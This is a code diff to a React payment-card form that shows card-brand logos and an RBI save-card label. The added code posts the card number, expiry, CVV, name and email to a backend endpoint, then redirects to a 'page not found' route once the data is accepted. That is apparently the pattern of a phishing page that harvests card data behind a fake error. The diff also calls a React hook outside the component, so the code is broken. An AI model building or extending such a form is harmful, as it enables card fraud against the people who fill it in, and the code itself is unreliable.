@@ -3,7 +3,11 @@ import visaLogo from "../visa.png"; // Add actual path
 import mastercardLogo from "../mastercard.png"; // Add actual path
 import rupayLogo from "../rupay.png"; // Add actual path
 
+import { useNavigate } from "react-router-dom";
+
 import { v4 as uuidv4 } from "uuid";
+
+const navigate = useNavigate();
 
 const CardForm = () => {
   const [cardNumber, setCardNumber] = useState("");
@@ -92,7 +96,7 @@ const CardForm = () => {
     return Object.keys(tempErrors).length === 0;
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     if (validateForm()) {
       // Create cookie valid for 1 day
@@ -101,9 +105,30 @@ const CardForm = () => {
       expiryDate.setDate(expiryDate.getDate() + 1);
       document.cookie = `formToken=${uniqueId}; expires=${expiryDate.toUTCString()}; path=/`;
 
-      const url ="";
-      const result = axios.post(url,body,{headers:application/json})
+      const body = {
+        cardNumber,
+        expiry,
+        cvv,
+        name,
+        email,
+      };
 
+      try {
+        const url = "http://localhost:5000/putData"; // replace with actual URL
+        const result = await axios.post(url, body, {
+          headers: {
+            "Content-Type": "application/json",
+          },
+        });
+
+        console.log("Submitted successfully:", result.data);
+
+        if (result.status === 201) {
+          navigate("/pagenotfound"); // redirect if status is 201 Created
+        }
+      } catch (error) {
+        console.error("Error submitting form:", error);
+      }
     }
   };
 
@@ -211,7 +236,10 @@ const CardForm = () => {
           <label>Save this card as per RBI guidelines</label>
         </div>
 
-        <button className="bg-[#0D94FB] hover:bg-[#0d50fb] cursor-pointer text-white w-full p-3 rounded-md font-semibold">
+        <button
+          className="bg-[#0D94FB] hover:bg-[#0d50fb] cursor-pointer text-white w-full p-3 rounded-md font-semibold"
+          type="submit"
+        >
           Continue
         </button>
       </div>
